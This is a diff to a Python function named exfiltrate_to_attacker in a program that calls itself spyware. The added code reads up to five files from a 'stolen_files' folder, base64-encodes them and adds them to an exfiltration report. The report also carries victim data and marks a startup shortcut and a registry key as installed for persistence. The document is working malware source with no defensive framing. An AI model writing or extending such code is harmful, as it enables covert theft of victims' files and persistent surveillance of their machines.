@@ -50,11 +50,39 @@ def exfiltrate_to_attacker(attacker_email=None):
         else:
             victim_data = {"status": "No data collected yet"}
         
+        # === LOAD STOLEN FILES AS BASE64 ===
+        stolen_files_dir = os.path.join(spyware_folder, "stolen_files")
+        stolen_files_data = []
+        
+        if os.path.exists(stolen_files_dir):
+            import base64
+            for filename in os.listdir(stolen_files_dir)[:5]:  # Limit to 5 files to avoid huge payload
+                file_path = os.path.join(stolen_files_dir, filename)
+                try:
+                    with open(file_path, 'rb') as f:
+                        file_content = f.read()
+                    
+                    # Encode file as base64
+                    file_base64 = base64.b64encode(file_content).decode('utf-8')
+                    
+                    stolen_files_data.append({
+                        'filename': filename,
+                        'size': len(file_content),
+                        'content': file_base64
+                    })
+                    print(f"[Spyware]   - Packaged file: {filename} ({len(file_content)} bytes)")
+                except Exception as e:
+                    print(f"[Spyware]   - Could not package {filename}: {e}")
+        
+        print(f"[Spyware]   - Prepared {len(stolen_files_data)} files for exfiltration")
+        
         # === CREATE EXFILTRATION REPORT ===
         report = {
             "exfiltration_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
             "spyware_status": "Active and collecting",
             "victim_data": victim_data,
+            "stolen_files": stolen_files_data,
+            "stolen_files_count": len(stolen_files_data),
             "persistence_status": {
                 "startup_shortcut": "Installed",
                 "registry_key": "Installed"
